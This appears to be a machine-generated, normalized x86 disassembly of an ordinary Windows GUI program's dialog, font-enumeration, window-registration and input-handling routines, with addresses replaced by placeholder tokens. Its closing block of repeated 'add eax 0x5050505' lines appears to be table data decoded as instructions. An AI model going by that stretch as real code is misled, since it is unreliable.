call edi
pop ebx
pop edi
mov eax 0x1
pop esi
retn 0x10
xor eax eax
sub_427020
push ecx
push ebx
push ebp
mov ebp [ SendDlgItemMessageA@IAT ]
push esi
push edi
mov edi eax
mov ax [ rw-data ]
cmp ax 0xffff
je r-xdata
push 0x0
push 0x0
push 0x147
push 0x550
push edi
call ebp
mov ebx [ EnableWindow@IAT ]
mov ebp [ GetDlgItem@IAT ]
mov [ rw-data ] ax
movsx eax ax
cmp eax 0x8
ja r-xdata
movsx ecx ax
cmp ecx 0x8
ja r-xdata
cmp [ rw-data ] 0x6
jne r-xdata
jmp [ eax * 4 + jump_table_427544 ]
mov esi [ esp + 0x10 ]
jmp [ ecx * 4 + jump_table_427520 ]
push 0x0
push 0x551
push edi
call [ CheckDlgButton@IAT ]
push 0x0
mov edx [ rw-data ]
movzx eax [ edx + 0x1a7 ]
push eax
push 0x551
push edi
call [ CheckDlgButton@IAT ]
push 0x1
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov edx [ rw-data ]
movzx eax [ edx + 0x17a ]
push eax
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0x150
jmp r-xdata
push 0x0
push 0x554
push edi
call ebp
push eax
call ebx
push 0x0
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0x48
mov esi 0x553
call sub_4267c0
mov ecx [ rw-data ]
movsx edx [ ecx + 0x70 ]
push 0x0
push edx
push 0x54e
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov eax [ rw-data ]
movzx ecx [ eax + 0xca ]
push ecx
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0xa0
mov esi 0x553
call sub_4267c0
mov edx [ rw-data ]
movsx eax [ edx + 0xc8 ]
push 0x0
push eax
push 0x54e
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov ecx [ rw-data ]
movzx edx [ ecx + 0x9e ]
push edx
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0x74
mov esi 0x553
call sub_4267c0
mov eax [ rw-data ]
movsx ecx [ eax + 0x9c ]
push 0x0
push ecx
push 0x54e
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov edx [ rw-data ]
movzx eax [ edx + 0xf6 ]
push eax
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0xcc
mov esi 0x553
call sub_4267c0
mov ecx [ rw-data ]
movsx edx [ ecx + 0xf4 ]
push 0x0
push edx
push 0x54e
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov eax [ rw-data ]
movzx ecx [ eax + 0x122 ]
push ecx
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0xf8
mov esi 0x553
call sub_4267c0
mov edx [ rw-data ]
movsx eax [ edx + 0x120 ]
push 0x0
push eax
push 0x54e
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov ecx [ rw-data ]
movzx edx [ ecx + 0x1a6 ]
push edx
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0x17c
mov esi 0x553
call sub_4267c0
mov eax [ rw-data ]
movsx ecx [ eax + 0x1a4 ]
push 0x0
push ecx
push 0x54e
push edi
call [ SetDlgItemInt@IAT ]
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov edx [ rw-data ]
movzx eax [ edx + 0x1d2 ]
push eax
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0x1a8
mov esi 0x553
call sub_4267c0
mov ecx [ rw-data ]
movsx edx [ ecx + 0x1d0 ]
mov [ esp + 0x10 ] edx
push 0xa
push ecx
fild [ esp + 0x18 ]
fstp [ esp ]
push 0x54e
push edi
call sub_420eb0
add esp 0x10
jmp r-xdata
push 0x1
push 0x554
push edi
call ebp
push eax
call ebx
mov eax [ rw-data ]
movzx ecx [ eax + 0x14e ]
push ecx
push 0x554
push edi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
add eax 0x124
movsx ecx [ esi + 0x28 ]
push ecx
push 0x3e8
push 0x4
push 0x54e
push edi
call sub_420c60
add esp 0x14
movsx eax [ esi + 0x28 ]
push 0x0
push 0xa
mov [ esp + 0x18 ] eax
push ecx
fild [ esp + 0x1c ]
fstp [ esp ]
push 0x44c80000
push 0x40000000
push 0x54e
push edi
call sub_420b60
add esp 0x1c
jmp r-xdata
mov esi [ rw-data ]
add esi 0x150
jmp r-xdata
mov esi [ rw-data ]
add esi 0x48
jmp r-xdata
mov esi [ rw-data ]
add esi 0xa0
jmp r-xdata
mov esi [ rw-data ]
add esi 0x74
jmp r-xdata
mov esi [ rw-data ]
add esi 0xcc
jmp r-xdata
mov esi [ rw-data ]
add esi 0xf8
jmp r-xdata
mov esi [ rw-data ]
add esi 0x17c
jmp r-xdata
mov esi [ rw-data ]
add esi 0x124
jmp r-xdata
mov esi [ rw-data ]
add esi 0x1a8
jmp r-xdata
push 0x551
push edi
call ebp
push eax
call ebx
push 0x554
push edi
call [ IsDlgButtonChecked@IAT ]
neg eax
sbb eax eax
inc eax
push eax
push 0x553
push edi
call ebp
push eax
call ebx
xor ecx ecx
cmp [ rw-data ] 0x7
sete cl
add ecx 0x149
push ecx
call sub_420ca0
add esp 0x4
push eax
push 0x552
push edi
call [ SetDlgItemTextA@IAT ]
call sub_426680
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi 0x553
call sub_4267c0
push r--data
push 0x54e
push edi
call [ SetDlgItemTextA@IAT ]
push esi
push eax
push 0x148
push 0x553
push edi
call ebp
mov ebx [ IsDlgButtonChecked@IAT ]
push 0x554
push edi
mov [ esi + 0x28 ] ax
call ebx
push 0x551
push edi
mov [ esi + 0x2a ] al
call ebx
push 0x0
push 0x0
push 0x147
push 0x553
push edi
mov [ esi + 0x2b ] al
call ebp
cmp eax 0xffffffff
je r-xdata
cmp ax 0x7
jne r-xdata
sub_427570
sub esp 0x140
push ebx
mov ebx [ SendDlgItemMessageA@IAT ]
push edi
push 0x0
push 0x0
push 0x14b
push 0x553
push esi
call ebx
lea eax [ esp + 0x8 ]
push eax
push 0x0
push 0x0
push r--data
mov ecx rw-data
call sub_425ab0
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push esi
call [ GetDC@IAT ]
push esi
push sub_426770
mov edi eax
push 0x0
push edi
call [ EnumFontFamiliesA@IAT ]
push edi
push esi
call [ ReleaseDC@IAT ]
mov eax esi
call sub_427020
pop edi
pop ebx
add esp 0x140
retn
push ebp
mov ebp [ FindNextFileA@IAT ]
lea esp [ esp ]
lea ecx [ esp + 0x38 ]
push ecx
push 0x0
push 0x143
push 0x553
push esi
call ebx
lea edx [ esp + 0xc ]
push edx
push edi
call ebp
test eax eax
jne r-xdata
push edi
call [ FindClose@IAT ]
pop ebp
sub_427620
mov eax [ esp + 0x8 ]
sub eax 0x110
push esi
push edi
je r-xdata
mov edx [ rw-data ]
mov edi [ esp + 0xc ]
push ebx
add edx 0x1c
push edx
push 0x54d
push edi
call [ SetDlgItemTextA@IAT ]
mov eax [ rw-data ]
mov esi [ SendDlgItemMessageA@IAT ]
push 0x1
push eax
push 0x30
push 0x54d
push edi
call esi
mov ecx [ rw-data ]
movzx edx [ ecx + 0x417 ]
mov ebx [ CheckDlgButton@IAT ]
push edx
push 0x549
push edi
call ebx
mov eax [ rw-data ]
movzx ecx [ eax + 0x418 ]
push ecx
push 0x54a
push edi
call ebx
mov edx [ rw-data ]
movzx eax [ edx + 0x42d ]
push eax
push 0x54f
push edi
call ebx
mov ebx [ GetStockObject@IAT ]
push 0x1
push 0xd
call ebx
push eax
push 0x30
push 0x546
push edi
call esi
push 0x1
push 0xd
call ebx
push eax
push 0x30
push 0x553
push edi
call esi
push 0x0
push 0x0
push 0x14b
push 0x550
push edi
call esi
xor ebx ebx
jmp r-xdata
dec eax
je r-xdata
movsx ecx [ ebx + rw-data ]
push ecx
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x550
push edi
call esi
add ebx 0x2
cmp ebx 0x12
jb r-xdata
movzx eax [ esp + 0x14 ]
add eax 0xfffffaba
cmp eax 0xe
ja r-xdata
sub eax 0x2f0
jne r-xdata
push 0x0
push 0x5
push 0x14e
push 0x550
push edi
call esi
push edi
call [ GetDC@IAT ]
push edi
push sub_426740
mov esi eax
push 0x0
push esi
mov [ rw-data ] 0xffff
call [ EnumFontFamiliesA@IAT ]
push esi
push edi
call [ ReleaseDC@IAT ]
mov eax [ rw-data ]
add eax 0x1c
mov esi 0x546
call sub_4267c0
mov esi edi
call sub_427570
pop ebx
pop edi
mov eax 0x1
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
movzx eax [ eax + lookup_table_4278dc ]
jmp [ eax * 4 + jump_table_4278c8 ]
mov esi [ esp + 0xc ]
mov edi [ IsDlgButtonChecked@IAT ]
push 0x549
push esi
call edi
mov ecx [ rw-data ]
push 0x54a
push esi
mov [ ecx + 0x417 ] al
call edi
mov edx [ rw-data ]
mov [ edx + 0x418 ] al
mov eax esi
call sub_427020
pop edi
mov eax 0x1
pop esi
retn 0x10
mov ecx [ rw-data ]
mov esi [ esp + 0xc ]
mov edi [ SendDlgItemMessageA@IAT ]
add ecx 0x1c
push ecx
push 0x0
push 0x0
push 0x147
push 0x546
push esi
call edi
push eax
push 0x148
push 0x546
push esi
call edi
mov edx [ rw-data ]
push edx
call [ DeleteObject@IAT ]
mov eax [ rw-data ]
add eax 0x1c
push eax
mov ecx rw-data
call sub_4138f0
mov ecx [ rw-data ]
add ecx 0x1c
push ecx
push 0x54d
push esi
mov [ rw-data ] eax
call [ SetDlgItemTextA@IAT ]
mov edx [ rw-data ]
push 0x1
push edx
push 0x30
push 0x54d
push esi
call edi
pop edi
mov eax 0x1
pop esi
retn 0x10
mov eax [ esp + 0xc ]
call sub_427020
pop edi
mov eax 0x1
pop esi
retn 0x10
mov edi [ esp + 0xc ]
call sub_426680
pop edi
mov eax 0x1
pop esi
retn 0x10
mov esi [ esp + 0xc ]
push 0x54f
push esi
call [ IsDlgButtonChecked@IAT ]
mov ecx [ rw-data ]
mov [ ecx + 0x42d ] al
call sub_427570
pop edi
mov eax 0x1
pop esi
retn 0x10
sub_4278f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x530
push esi
push edi
mov ecx 0x14c
mov esi rw-data
lea edi [ esp + 0x8 ]
[ edi ] [ esi ]
lea eax [ esp + 0x8 ]
push rw-data
mov ecx rw-data
mov [ rw-data ] eax
call sub_4138f0
push rw-data
push 0x39f
mov [ rw-data ] eax
call sub_4215d0
mov ecx [ rw-data ]
add esp 0x8
push ecx
mov esi eax
call [ DeleteObject@IAT ]
test esi esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edx [ esp + 0x8 ]
push edx
mov ecx rw-data
call sub_425d10
sub_427970
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431eca
push eax
mov [ fs : 0x0 ] esp
sub esp 0x404
push esi
push edi
movzx edi [ esp + 0x41c ]
mov eax edi
cmp eax 0x9c78
mov esi ecx
jg r-xdata
sub eax 0x9c7a
cmp eax 0xd
ja r-xdata
je r-xdata
cmp edi 0x5209
jl r-xdata
jmp [ eax * 4 + jump_table_4280c0 ]
push 0xa
call sub_425660
jmp r-xdata
sub eax 0x2711
cmp eax 0x2f
ja r-xdata
cmp edi 0x4e20
jl r-xdata
cmp edi 0x5211
jg r-xdata
mov ecx esi
call sub_413b90
jmp r-xdata
mov ecx esi
call sub_411520
jmp r-xdata
push 0x1
push 0x1
push 0x4c
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x1
push 0x1
push 0x42
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x1
push 0x1
push 0x53
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x48
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x34
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x1
push 0x1
push 0x52
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x1
push 0x1
push 0x49
mov ecx esi
call sub_40f360
jmp r-xdata
mov ecx rw-data
call sub_402620
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x414 ] 0x2
je r-xdata
mov ecx rw-data
call sub_414120
jmp r-xdata
mov edx [ rw-data ]
push edx
mov [ rw-data ] rw-data
call sub_4164a0
jmp r-xdata
mov ecx rw-data
call sub_4245b0
jmp r-xdata
add esp 0x4
jmp [ eax * 4 + jump_table_428000 ]
mov ecx [ esp + 0x40c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x410
retn 0x4
cmp edi 0x4e29
jg r-xdata
lea eax [ edi - 0x5207 ]
push eax
call sub_411f70
add esp 0x4
mov ecx rw-data
mov [ esp + 0x414 ] 0xffffffff
call sub_413a00
mov ecx [ rw-data ]
push 0x85
call sub_40f160
jmp r-xdata
push 0x1
push 0x0
push 0x0
mov ecx eax
call sub_4126f0
mov ecx rw-data
call sub_402620
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x414 ] 0x0
je r-xdata
mov ecx rw-data
call sub_402620
call sub_412da0
jmp r-xdata
mov ecx esi
call sub_412bb0
jmp r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
call sub_4123c0
mov ecx [ rw-data ]
call sub_4113e0
jmp r-xdata
mov ecx rw-data
call sub_402620
mov ecx [ rw-data ]
cmp [ ecx ] ecx
je r-xdata
mov ecx rw-data
call sub_402620
push 0x0
mov ecx esi
call sub_411fe0
jmp r-xdata
mov ecx rw-data
call sub_402620
mov ecx esi
call sub_4121d0
jmp r-xdata
mov ecx rw-data
call sub_402620
mov ecx [ rw-data ]
mov esi ecx
push 0x0
mov ecx esi
call sub_4239e0
jmp r-xdata
push 0x1
mov ecx esi
call sub_4239e0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x1
push 0x5a
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x59
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x1
call sub_425660
jmp r-xdata
push 0x0
call sub_425660
jmp r-xdata
push 0x2
call sub_425660
jmp r-xdata
push 0x0
push 0x1
push 0x58
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x43
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x56
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x1
push 0x1
push 0x41
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0xd
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
mov ecx rw-data
call sub_410ea0
jmp r-xdata
mov ecx rw-data
call sub_410e70
jmp r-xdata
mov al [ rw-data ]
test al al
sete dl
mov [ rw-data ] dl
push 0x0
mov ecx rw-data
call sub_410ef0
jmp r-xdata
push 0x0
push 0x0
push 0x71
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x4c
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x49
mov ecx esi
call sub_40f360
jmp r-xdata
push 0x0
push 0x1
push 0x54
mov ecx esi
call sub_40f360
jmp r-xdata
call sub_4174c0
jmp r-xdata
mov ecx rw-data
call sub_4139b0
mov ecx rw-data
call sub_4139b0
mov ecx rw-data
call sub_413af0
mov ecx esi
call sub_4113e0
jmp r-xdata
mov [ rw-data ] 0x1
mov eax [ rw-data ]
push 0x0
push sub_425210
push eax
push 0x38d
call sub_420d20
add esp 0x10
mov [ rw-data ] 0x0
jmp r-xdata
mov ecx esi
call sub_423230
jmp r-xdata
push 0x0
push 0x1
push 0x44
mov ecx esi
call sub_40f360
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_4278f0
jmp r-xdata
push rw-data
mov ecx rw-data
call sub_425d10
jmp r-xdata
mov ecx rw-data
call sub_425e50
jmp r-xdata
push 0x1
call sub_418180
jmp r-xdata
mov ecx [ esi ]
call sub_4113e0
jmp r-xdata
mov ecx [ esi + 0x4 ]
call sub_4113e0
jmp r-xdata
push 0x0
call sub_411f70
jmp r-xdata
mov edx [ rw-data ]
push 0x0
push edx
call sub_414bc0
add esp 0x8
jmp r-xdata
push r--data
lea eax [ esp + 0x210 ]
push 0x1
push eax
call sub_420b10
push r--data
lea ecx [ esp + 0x1c ]
push 0x2
push ecx
call sub_420b10
mov ecx [ rw-data ]
add esp 0x18
push 0x0
lea edx [ esp + 0x10 ]
push edx
lea eax [ esp + 0x214 ]
push eax
push ecx
call [ MessageBoxA@IAT ]
jmp r-xdata
push edi
call sub_412ea0
push 0x1
push 0x0
push 0x0
mov ecx eax
call sub_4126f0
jmp r-xdata
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x414 ] 0x1
je r-xdata
push 0x0
call sub_4123c0
test eax eax
jne r-xdata
push 0x0
call sub_411fe0
mov ecx [ rw-data ]
mov ecx [ ecx ]
cmp ecx esi
mov [ rw-data ] ecx
jne r-xdata
jmp r-xdata
mov ecx rw-data
call sub_402620
mov ecx rw-data
call sub_425f60
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov esi [ SendMessageA@IAT ]
mov edi [ DestroyWindow@IAT ]
mov ecx [ rw-data ]
push 0x0
push sub_425230
push ecx
push 0x399
call sub_420cd0
add esp 0x10
jmp r-xdata
push eax
call [ SetForegroundWindow@IAT ]
jmp r-xdata
xor eax eax
push 0x1
push 0x0
push 0x0
mov ecx eax
call sub_4126f0
jmp r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] ecx
jne r-xdata
lea esp [ esp ]
mov ecx [ eax + 0x4 ]
push ecx
call edi
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
lea edx [ esp + 0x8 ]
push edx
push 0x0
push 0x40d
push eax
call esi
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push 0x0
call sub_4123c0
jmp r-xdata
test eax eax
mov [ esp + 0x414 ] 0xffffffff
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push 0x1
call sub_4123c0
test eax eax
jne r-xdata
jmp r-xdata
sub_428100
mov eax [ esp + 0x8 ]
sub esp 0x40
cmp eax 0x113
push esi
ja r-xdata
lea ecx [ eax - 0x114 ]
cmp ecx 0xf0
ja r-xdata
je r-xdata
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
push ecx
push edx
push eax
mov eax [ esp + 0x54 ]
push eax
call [ DefWindowProcA@IAT ]
pop esi
add esp 0x40
retn 0x10
movzx ecx [ ecx + lookup_table_4282e0 ]
jmp [ ecx * 4 + jump_table_4282d0 ]
cmp [ esp + 0x50 ] 0x2
jne r-xdata
cmp eax 0xf
ja r-xdata
mov edx [ esp + 0x50 ]
mov ecx [ rw-data ]
push edx
call sub_40e510
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov eax [ esp + 0x50 ]
mov ecx [ rw-data ]
push eax
call sub_40eba0
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x50 ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
call sub_410230
xor eax eax
pop esi
add esp 0x40
retn 0x10
mov eax [ esp + 0x48 ]
push 0x1
push eax
call [ KillTimer@IAT ]
movsx ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push ecx
push 0x1
call [ mouse_event@IAT ]
xor edx edx
cmp [ rw-data ] 0x1
pop esi
setne dl
xor eax eax
lea edx [ edx + edx - 0x1 ]
mov [ rw-data ] dx
add esp 0x40
retn 0x10
mov edx [ esp + 0x54 ]
mov ecx [ rw-data ]
push edx
push 0x2
push 0x113
call sub_410230
xor eax eax
pop esi
add esp 0x40
retn 0x10
cmp eax 0x111
jne r-xdata
je r-xdata
mov ecx [ esp + 0x50 ]
push ecx
mov ecx [ rw-data ]
call sub_427970
xor eax eax
pop esi
add esp 0x40
retn 0x10
push ebx
mov ebx [ esp + 0x4c ]
push edi
lea ecx [ esp + 0xc ]
push ecx
push ebx
call [ BeginPaint@IAT ]
mov edi [ GetSysColor@IAT ]
push 0x5
mov esi eax
call edi
push eax
push esi
call [ SetBkColor@IAT ]
push 0x8
call edi
push eax
push esi
call [ SetTextColor@IAT ]
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx eax
dec ecx
je r-xdata
lea eax [ esp + 0xc ]
push eax
push ebx
call [ EndPaint@IAT ]
pop edi
pop ebx
xor eax eax
pop esi
add esp 0x40
retn 0x10
lea edx [ esp + 0x14 ]
push edx
push esi
call sub_40ea90
mov esi [ esp + 0x48 ]
call sub_425940
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub ecx 0x6
jne r-xdata
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
xor eax eax
pop esi
add esp 0x40
retn 0x10
sub_4283e0
test esi esi
push edi
je r-xdata
mov cl [ rw-data ]
test cl cl
mov eax 0x50800000
je r-xdata
mov edi [ RegisterClassA@IAT ]
push esi
mov [ esi ] 0x3
mov [ esi + 0x1c ] 0x10
mov [ esi + 0x4 ] sub_425750
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
mov cl [ rw-data ]
test cl cl
je r-xdata
mov eax 0x50900000
mov eax 0x1
pop edi
retn
push esi
mov [ esi ] 0x3
mov [ esi + 0x4 ] sub_425570
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
push 0x0
push ecx
push 0x3
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push 0x0
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
or eax 0x200000
push esi
mov [ esi ] 0xb
mov [ esi + 0x1c ] 0x6
mov [ esi + 0x4 ] sub_428100
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
push 0x5
push eax
call [ ShowWindow@IAT ]
xor eax eax
pop edi
retn
sub_4284c0
mov eax [ esp + 0x8 ]
cmp eax 0x10
mov edx [ esp + 0x10 ]
push esi
push edi
ja r-xdata
cmp eax 0x20a
ja r-xdata
je r-xdata
lea ecx [ eax - 0x233 ]
cmp ecx 0xd4
ja r-xdata
je r-xdata
mov esi [ GetKeyState@IAT ]
push 0x12
call esi
test ax ax
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx 0x7
ja r-xdata
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x10 ]
push ecx
push eax
push edx
call [ DefWindowProcA@IAT ]
pop edi
pop esi
retn 0x10
movzx ecx [ ecx + lookup_table_428b40 ]
jmp [ ecx * 4 + jump_table_428b2c ]
push 0x0
lea edx [ esp + 0x14 ]
push edx
push 0x0
push 0x68
call [ SystemParametersInfoA@IAT ]
mov ecx [ rw-data ]
mov edi eax
mov eax [ esp + 0x14 ]
movzx edx ax
shr eax 0x10
movsx eax ax
add ecx eax
test dl 0x8
mov [ esp + 0x10 ] edx
mov [ rw-data ] ecx
je r-xdata
lea ecx [ eax - 0x4e ]
cmp ecx 0xc3
ja r-xdata
push 0x11
call esi
test ax ax
mov eax 0x1
jl r-xdata
xor eax eax
jmp r-xdata
jmp [ ecx * 4 + jump_table_428958 ]
call sub_401950
pop edi
xor eax eax
pop esi
retn 0x10
mov edx [ esp + 0x14 ]
push edx
push eax
call sub_401980
add esp 0x8
pop edi
xor eax eax
pop esi
retn 0x10
mov eax [ esp + 0xc ]
push eax
call [ IsWindowUnicode@IAT ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
mov ecx [ rw-data ]
call sub_40e150
pop edi
xor eax eax
pop esi
retn 0x10
mov edx [ esp + 0x14 ]
push edx
call sub_412d30
add esp 0x4
pop edi
xor eax eax
pop esi
retn 0x10
test dl 0x4
jne r-xdata
cmp ecx 0x78
jle r-xdata
movzx ecx [ ecx + lookup_table_428990 ]
jmp [ ecx * 4 + jump_table_428978 ]
mov edx [ esp + 0xc ]
neg eax
sbb eax eax
push 0x0
and eax 0xfffffff9
add eax 0x271b
push eax
push 0x111
push edx
call [ SendMessageA@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
movzx eax [ rw-data ]
mov eax [ esp + 0xc ]
push eax
call [ IsIconic@IAT ]
test eax eax
jne r-xdata
push 0x1
mov ecx rw-data
call sub_424650
mov ecx rw-data
call sub_427000
mov ecx rw-data
call sub_402690
mov ecx [ rw-data ]
push ecx
call [ DestroyMenu@IAT ]
call sub_408030
call sub_416480
call sub_401950
call sub_413c90
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
mov ecx rw-data
call sub_40e8d0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
cmp ecx 0x78
jle r-xdata
cmp edi 0xffffffff
je r-xdata
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov [ rw-data ] 0x0
call sub_4113e0
pop edi
xor eax eax
pop esi
retn 0x10
mov eax [ esp + 0x14 ]
cmp eax 0x9
je r-xdata
mov esi [ GetKeyState@IAT ]
push 0x10
call esi
xor edx edx
test ax ax
setl dl
push 0x11
mov edi edx
call esi
mov edx [ esp + 0x14 ]
xor ecx ecx
test ax ax
setl cl
push edi
mov eax ecx
mov ecx [ rw-data ]
push eax
push edx
mov [ esp + 0x1c ] eax
call sub_40f360
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ edx + 0x8 ]
add ecx 0x2c5
cmp ecx 0xbd
ja r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
push eax
call sub_427970
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ rw-data ]
push 0x0
push ecx
call sub_414bc0
add esp 0x8
pop edi
xor eax eax
pop esi
retn 0x10
push eax
mov ecx rw-data
call sub_424260
push 0x0
mov ecx rw-data
call sub_402550
mov esi [ rw-data ]
call sub_425940
mov ecx rw-data
call sub_424570
push 0x0
call [ PostQuitMessage@IAT ]
pop edi
xor eax eax
pop esi
retn 0x10
cmp eax [ rw-data ]
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
call sub_40db90
pop edi
xor eax eax
pop esi
retn 0x10
call [ DestroyCaret@IAT ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
jmp r-xdata
cmp ecx 0x78
jle r-xdata
pop edi
xor eax eax
pop esi
retn 0x10
mov edx [ rw-data ]
mov ecx [ edx + 0x4 ]
mov [ rw-data ] 0x0
call sub_4113e0
pop edi
xor eax eax
pop esi
retn 0x10
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ rw-data ]
push eax
call sub_417d20
movzx ecx [ ecx + lookup_table_428a6c ]
jmp [ ecx * 4 + jump_table_428a54 ]
push eax
call [ FreeLibrary@IAT ]
lea ecx [ ecx ]
mov ecx [ rw-data ]
push 0x2
call sub_40e510
mov ecx [ rw-data ]
sub ecx 0x78
cmp ecx 0x78
mov [ rw-data ] ecx
jg r-xdata
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jle r-xdata
test edi edi
jle r-xdata
mov edx [ esp + 0xc ]
push 0xa07
push edx
call sub_414bc0
add esp 0x8
pop edi
mov eax 0x1
pop esi
retn 0x10
mov ecx rw-data
call sub_4247c0
pop edi
mov eax 0x1
pop esi
retn 0x10
push edx
mov ecx rw-data
call sub_4245f0
pop edi
pop esi
retn 0x10
push edx
mov ecx rw-data
call sub_424820
pop edi
pop esi
retn 0x10
mov ecx [ rw-data ]
push 0x3
call sub_40e510
mov eax [ rw-data ]
add eax 0x78
mov [ rw-data ] eax
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jg r-xdata
test edi edi
jle r-xdata
sub ecx 0x78
cmp ecx 0x78
mov [ rw-data ] ecx
jg r-xdata
mov esi edi
lea ecx [ ecx ]
add ecx 0x78
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
mov [ rw-data ] ecx
jg r-xdata
mov esi edi
lea ebx [ ebx ]
mov ecx [ rw-data ]
push 0x0
call sub_40e510
dec esi
jne r-xdata
mov ecx [ rw-data ]
pop edi
xor eax eax
pop esi
retn 0x10
mov ecx [ rw-data ]
push 0x1
call sub_40e510
dec esi
jne r-xdata
mov ecx [ rw-data ]
sub_428996
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
